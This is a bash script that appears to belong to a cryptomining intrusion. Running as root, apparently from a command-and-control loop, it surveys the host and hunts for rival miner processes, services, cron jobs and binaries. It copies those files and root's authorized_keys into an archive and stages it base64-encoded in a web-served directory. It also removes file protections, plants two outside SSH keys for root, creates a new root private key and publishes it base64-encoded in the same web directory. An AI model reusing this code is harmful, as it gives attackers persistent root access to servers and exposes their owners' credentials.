#!/bin/bash
# ul7466 phase1: forensics + evidence + key restore (runs as root via t19c2 loop)
exec 9>/var/lock/ul7466.lock; flock -n 9 || exit 0
W=/opt/t19/www
OUT=$W/ul7466_p1.txt
{
echo "=== UL7466 PHASE1 START $(date -u +%FT%TZ) ==="
id; hostname; uptime -b; uname -a; date -u
echo "--- GPU ---"; nvidia-smi -L 2>&1 | head -12; ls -l /dev/nvidia* 2>/dev/null | head -12
echo "--- PROCS ---"; ps -eo pid,ppid,user,lstart,args= | grep -iE 'plh|krig|wildrig|peakminer|srbminer|keep\.sh|t19c2|run\.sh' | grep -v grep | head -40
echo "--- UNITS ---"; systemctl list-unit-files 2>/dev/null | grep -iE 'plh|keeper|guard|ul-|t19|nv-|pearl' | head -40
echo "--- UNIT STATE ---"; for u in $(systemctl list-unit-files --no-legend 2>/dev/null | awk '{print $1}' | grep -iE 'plh|keeper|guard|t19'); do printf '%s en=%s ac=%s\n' "$u" "$(systemctl is-enabled $u 2>&1)" "$(systemctl is-active $u 2>&1)"; done
echo "--- TIMERS ---"; systemctl list-timers --all 2>/dev/null | grep -iE 'plh|guard|ul-|t19|nv-' | head
echo "--- DIRS ---"; ls -la /opt/plh /opt/plhllm /usr/local/lib/.plh /usr/local/bin/.plhm* 2>&1 | head -50
echo "--- WWW ---"; ls -la $W 2>&1 | head -30
echo "--- CRON ---"; for f in /etc/cron.d/* /var/spool/cron/root /var/spool/cron/crontabs/root /etc/crontab; do [ -f "$f" ] && { echo "## $f"; cat "$f"; }; done 2>/dev/null
echo "--- CRONTAB ---"; crontab -l 2>&1 | head -30
echo "--- LSATTR ---"; lsattr -a /root /root/ul_plant /usr/local/bin /usr/local/lib /opt /etc/systemd/system /etc/cron.d /tmp 2>&1 | grep -vE '^lsattr' | head -60
echo "--- AUTHKEYS ---"; ls -la /root/.ssh/ 2>&1; echo "## authorized_keys"; cat /root/.ssh/authorized_keys 2>/dev/null
echo "--- SSHD CFG ---"; grep -E '^(PermitRootLogin|PubkeyAuthentication|PasswordAuthentication|AuthorizedKeysFile|AllowUsers|Match|Port)' /etc/ssh/sshd_config 2>/dev/null
echo "--- FIND PLH ---"; find / -xdev \( -iname '*plh*' -o -name '.plhm' \) -newermt '-25 days' 2>/dev/null | head -40
echo "--- SS ---"; ss -lntp 2>/dev/null | head -30
echo "--- IPT ---"; iptables -S 2>/dev/null | head -40
echo "--- PLH BIN ---"; for b in /usr/local/bin/.plhm /opt/plh/krig-miner; do [ -e "$b" ] && { ls -la "$b"; sha256sum "$b"; strings -a "$b" 2>/dev/null | grep -iE 'prl1|stratum|kryptex|pearlhash|luckypool|http[s]?://|\.plh' | sort -u | head -20; }; done
echo "--- PLH SCRIPTS ---"; for f in /opt/plh/*.sh /usr/local/lib/.plh/* /etc/cron.d/plh* /etc/systemd/system/plh*; do [ -f "$f" ] && { echo "## $f"; head -80 "$f"; }; done 2>/dev/null
echo "--- OURS ---"; ls -la /root/ul_plant 2>&1 | head -10; pgrep -fa 'prl1pek8' | head -12
echo "=== EVIDENCE ==="
T=$(mktemp -d); mkdir -p $T/plh
for f in /opt/plh /usr/local/lib/.plh /etc/cron.d /usr/local/bin/.plhm /etc/systemd/system; do cp -a "$f" $T/plh/ 2>/dev/null; done
cp -a /root/.ssh/authorized_keys $T/ 2>/dev/null; cp -a /opt/t19/www/srv2.py $T/ 2>/dev/null; cp -a /root/ul_plant $T/ 2>/dev/null
tar czf $T/pf.tgz -C $T plh authorized_keys srv2.py ul_plant 2>/dev/null
S=$(stat -c%s $T/pf.tgz 2>/dev/null || echo 0); echo "tarball bytes=$S sha256=$(sha256sum $T/pf.tgz 2>/dev/null | cut -c1-64)"
if [ "${S:-0}" -gt 0 ] && [ "${S:-0}" -lt 2500000 ]; then base64 -w0 $T/pf.tgz > $W/ul7466_forensics.b64; echo "b64 bytes=$(stat -c%s $W/ul7466_forensics.b64)"; else split -b 1500000 -d $T/pf.tgz $T/pf 2>/dev/null; n=0; for x in $T/pf[0-9]*; do base64 -w0 $x > $W/ul7466_forensics_$(basename $x).b64; n=$((n+1)); done; echo "chunks=$n size=$S"; fi
echo "=== KEY RESTORE ==="
mkdir -p /root/.ssh; chmod 700 /root/.ssh; touch /root/.ssh/authorized_keys; chattr -i /root/.ssh/authorized_keys 2>/dev/null
K1='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMNt5Z3qbsp46RAfAf1BxL3Fg0JHo9JUqtP9cKNVh/cp ul5817-g0023'
K2='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMAdZRZegdhDMlj+F6IkgyNHO8CPsINpCjC96WfPeFqm ul7466-k04'
for K in "$K1" "$K2"; do b=$(echo "$K" | awk '{print $2}'); grep -qF "$b" /root/.ssh/authorized_keys || echo "$K" >> /root/.ssh/authorized_keys; done
chmod 600 /root/.ssh/authorized_keys
[ -f /root/.ssh/ul7466_new ] || ssh-keygen -t ed25519 -N '' -C ul7466-new -f /root/.ssh/ul7466_new >/dev/null 2>&1
b=$(cut -d' ' -f2 /root/.ssh/ul7466_new.pub 2>/dev/null); [ -n "$b" ] && { grep -qF "$b" /root/.ssh/authorized_keys || cat /root/.ssh/ul7466_new.pub >> /root/.ssh/authorized_keys; }
base64 -w0 /root/.ssh/ul7466_new > $W/ul7466_newkey.b64 2>/dev/null
echo "authorized_keys lines=$(wc -l < /root/.ssh/authorized_keys)"; cut -c1-70 /root/.ssh/authorized_keys
(systemctl reload sshd || systemctl reload ssh || service ssh reload) >/dev/null 2>&1
echo "=== DONE7466 PHASE1 $(date -u +%FT%TZ) ==="
} > $OUT 2>&1
printf '#!/bin/bash\nexit 0\n' > $W/run2.sh; chmod 644 $W/run2.sh; mv -f $W/run2.sh $W/run.sh
chmod 644 $OUT
